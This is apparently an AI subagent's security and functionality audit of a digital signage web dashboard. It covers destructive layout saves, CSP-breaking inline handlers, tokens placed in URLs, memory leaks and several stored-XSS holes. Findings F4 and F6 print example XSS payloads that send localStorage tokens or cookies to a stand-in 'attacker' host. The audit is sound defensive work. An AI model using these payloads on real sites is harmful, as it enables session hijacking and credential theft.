# ScreenTinker Frontend Dashboard Audit — 2026-05-28

**Branch:** `screen-share`  **HEAD:** `457d7d4`  **Auditor:** general-purpose subagent  **Scope:** `frontend/**` only

> Note: only `layout-editor.js` exists — there is no `layouts.js`; layouts list/editor are both in `layout-editor.js`.

## P0 (production-blocker)

### F1. Layout save is destructive and races content assignments
**File:** `frontend/js/views/layout-editor.js:283-297`
**Issue:** Save handler DELETEs every zone in `layout.zones` (the original fetched array) then POSTs every current zone. Failure modes:
1. If any DELETE returns non-2xx, `API()` swallows it (line 5 has no `r.ok` check) → loop continues with partially-destroyed layout.
2. Newly POSTed zones get fresh UUIDs/ids on every save — any `assignments.zone_id` rows referencing previous zone ids become orphaned. **This is almost certainly why "templates don't work properly."**
3. Two phases are sequential awaits with no transaction: network blip between DELETE and POST leaves the layout zoneless.
**Fix:** Replace with a single PUT to `/api/layouts/:id` that takes the full zone array as canonical state; server diff-updates by id. At minimum, `if (!res.ok) throw` in `API()`.

### F2. Layout zones have no content assignment, fit_mode, or background controls in the editor UI
**File:** `frontend/js/views/layout-editor.js:241-266, 269`
**Issue:** Editor only lets the user edit `name, x_percent, y_percent, width_percent, height_percent, zone_type`. No UI for `fit_mode`, no background color picker, no z_index, **no way to pick content per zone**. From user's perspective the "templates" view lets you draw boxes that do nothing.
**Fix:** Either (a) add zone-level default content_id/playlist_id with drag-from-right-panel, OR (b) re-label this as "Zone templates — assign content per device" with link to device-detail's Edit Assignment modal.

### F3. ~30 inline `onclick="..."` and `onerror="..."` handlers violate enforced CSP
**Files:** `frontend/js/app.js:530`; `device-detail.js:388-413, 145`; `dashboard.js:87, 88, 172`; `video-wall.js:58`; `teams.js:46`; `kiosk.js:42, 51, 52`; `billing.js:92, 93, 97`; `schedule.js:52, 113`; `widgets.js:69, 160, 166, 447, 475`; `designer.js:471`
**Issue:** Per 2026-05-20 security remediation, server-side CSP is "enforcing". Every inline handler will silently fail or trip CSP reports, breaking: remote control panel (volume/dpad/power), wall navigation, Stripe checkout, schedule/widget modal close, designer Save Design.
**Reproduction:** Open device-detail for a paired display, click Volume Up. No-op. Console shows CSP refusal.
**Fix:** Replace every inline handler with `addEventListener` wiring after the innerHTML pass (same pattern as `app.js:542` for `[data-close-modal]`).

### F4. Stored XSS via `designer.js` widget publishing
**File:** `frontend/js/views/designer.js:471-476, 511-560`
**Issue:** `generateInnerHTML()` writes user-controlled fields directly into HTML output and into `<script>` tag bodies. User sets text element content to `</script><script>fetch('https://attacker/exfil?t='+localStorage.token)</script>` → every viewer pwned. Also line 471's `onclick="(() => { ... ${JSON.stringify(elements)} ...})()"` — a single quote in any element field breaks out and executes whatever follows.
**Reproduction:** Designer → Add Heading → text = `<img src=x onerror=alert(1)>` → Save Design → preview triggers payload. Publish, assign to device → every viewer pwned.
**Fix:** HTML-escape every interpolated value; refactor "Save Design" button to use `addEventListener`.

### F5. XSS via Toast component — every user-named upload triggers it
**File:** `frontend/js/components/toast.js:13`
**Issue:** `<span>${message}</span>` is innerHTML. `message` is filled from `err.message` (server text passed verbatim) and user-controlled strings like `file.name`, `device.name`, `playlist.name`, `wl.brand_name`. Filename `<img src=x onerror=...>.mp4` fires payload on upload-completion toast. Referenced from 23 view files.
**Fix:** Use `<span>` element with `textContent = message`. Two-line change.

### F6. Stored XSS in Admin and Settings tables — user-controlled display_name → admin session
**Files:** `frontend/js/views/admin.js:63, 65, 75, 154`; `frontend/js/views/settings.js:426, 427, 430, 433, 437`
**Issue:** Plan `display_name`, user `name`, `email`, `auth_provider`, `role` all rendered with `${u.foo}` into innerHTML. Register with `name = <img src=x onerror=fetch('//attacker/'+document.cookie)>` → any platform admin opening `/admin` is owned. **Most impactful XSS in the audit** because it lands in a platform-admin session.
**Fix:** Wrap every `${u.…}` and `${p.…}` with `esc()`.

### F7. JWT smuggled in query strings — leaks to logs, referrers, history
**Files:** `frontend/js/views/dashboard.js:82-83, 365`; `device-detail.js:62-63, 145`; `admin.js:179`; `settings.js:193`
**Issue:** Bearer JWT appended as `?token=…` for screenshot, status-export, backup download URLs. Web server access logs, forward proxies, browser history all record token.
**Fix:** Switch to authenticated `fetch` streaming blob into `URL.createObjectURL`, or move auth to short-lived signed URL endpoint.

## P1 (high)

### F8. P1-confirmed: per-item fullscreen/fit toggle absent in playlists and content library
**Files:** `frontend/js/views/playlists.js:288-318` (item rows show only duration_sec, move, remove); `content-library.js:484-592` (edit modal: filename, mime_type, folder, replace-file)
**Issue:** Verified — neither upload form, content edit modal, nor playlist item row exposes `fit_mode`/fullscreen toggle. Data model supports it (`layout-editor.js:269` writes `fit_mode: 'cover'` at zone level, `api.updatePlaylistItem` accepts arbitrary fields), but UI doesn't surface it.
**Fix:** Add `<select>` to content edit modal (cover/contain/fill) → `api.updateContent`. Mirror in playlist item row for per-instance override.

### F9. P1-confirmed: video-wall canvas has no manual dimension/refresh-rate override
**File:** `frontend/js/views/video-wall.js:189-194, 14-15`
**Issue:** cols/rows/bezel exist but only drive Auto-arrange. No input for `canvas_width × canvas_height × refresh_rate_hz` at wall level. For Classroom 1 (12372×2160 @ 59.94 Hz) user must manually compute every tile's position. Save payload (line 622-626) doesn't send any wall-level `canvas_*` or `refresh_rate_hz`.
**Fix:** Add three inputs next to grid_cols/grid_rows: "Wall pixel width", "Wall pixel height", "Refresh rate Hz". Persist as `wall.canvas_width/canvas_height/refresh_rate_hz`. Add "Distribute screens evenly across canvas" button. Ensure `screen-share.js:computeWallTiles` reads wall's `canvas_*` if set.

### F10. P1-confirmed: file inputs reject PDF/PPT/XLS/DOC at the picker
**Files:** `frontend/js/views/content-library.js:32, 531`; `onboarding.js:63`
**Issue:** `accept="video/*,image/*"` blocks all document uploads at OS file picker level.
**Fix:** Expand to `accept="video/*,image/*,application/pdf,application/vnd.openxmlformats-officedocument.*,application/msword,application/vnd.ms-excel,application/vnd.ms-powerpoint"`.

### F11. P1-confirmed: layout templates view rendering bugs (root cause of "templates don't work")
**File:** `frontend/js/views/layout-editor.js:87, 92, 100, 169`
**Issue:** Template card body interpolates `${z.name}`, `${layout.name}`, `${zoneCount}` unescaped. Combined with F1 (destructive save): user perception of "templates don't work" maps to "I clicked Use Template, dragged a zone, saved, assigned content to device — nothing showed up."
**Fix:** See F1; additionally, escape `z.name`, `layout.name`, `z.zone_type` (line 232).

### F12. XSS in workspace switcher's resolution and device-detail device name
**Files:** `frontend/js/views/device-detail.js:117, 119`; `dashboard.js:362-373` (screenshot handler innerHTML)
**Fix:** Use `esc(device.name)`. For screenshot handler, set `img.src = imgSrc` via property setter, not innerHTML.

### F13. Memory leaks across SPA route changes
**Files:** `frontend/js/views/dashboard.js:836-852`; `components/workspace-switcher.js:144`; `video-wall.js:791-797`
**Issues:**
1. `dashboard.js cleanup()` calls `off('device-added', () => {})` with fresh arrow — original handler never assigned to module-scoped var, so listener never removed. Each dashboard re-render leaks one handler.
2. `workspace-switcher.js:144` adds `document.addEventListener('click', ...)` on every call. After 30 nav clicks, 30 listeners fire per click.
3. `video-wall.js` `cleanupHooks` at module scope — multiple renders push but `cleanup()` only drains once.
**Fix:** Store handler refs as module-level lets. Keep single `_outsideClickHandler` ref. Reset `cleanupHooks = []` at top of `renderWallEditor`.

### F14. Login.js references undefined globals `google` and `msal`
**File:** `frontend/js/views/login.js:230, 268`
**Issue:** Google/Microsoft OAuth scripts never loaded. Clicking button → `ReferenceError`. Also CSP would block these external scripts.
**Fix:** Add idempotent `loadScript(src)` helper. CSP must include `accounts.google.com` and `alcdn.msauth.net`.

### F15. Session-expiry warning's inline-onclick re-login link won't clear token under CSP
**File:** `frontend/js/app.js:530`
**Issue:** Inline onclick blocked → token not cleared → `isAuthenticated()` returns true → redirected back. User stuck in loop until JWT actually expires.
**Fix:** Replace with `<button>` and delegated click listener.

## Notes

- **Confirmed P1 bugs:** all four (no fit/fullscreen toggle, no manual wall canvas dimensions, layouts broken via destructive save + missing assignment UI, file picker rejects docs).
- **Most urgent fixes:** F1 (destructive layout save) + F3/F5/F6 (CSP-broken handlers, toast XSS, admin-table XSS). Production correctness and admin-session compromise respectively.
- **`layout-editor.js` is the most fragile file** — carries F1, F2, F11 simultaneously. A full rewrite using `video-wall.js renderWallEditor` pattern (server-roundtripped state, single PUT, escape everywhere) would clean it up.
- **Inline-handler regression:** ~30+ inline onclick handlers remain. Either CSP isn't actually as strict as documented, or several UI flows are quietly broken in production. Recommend running the dashboard in a browser with strict CSP logging to confirm which paths are dead.
- **Token-in-URL pattern (F7)** is widespread enough that a single `frontend/js/api.js`-level helper for "authenticated blob fetch" would let you delete 7+ instances at once.
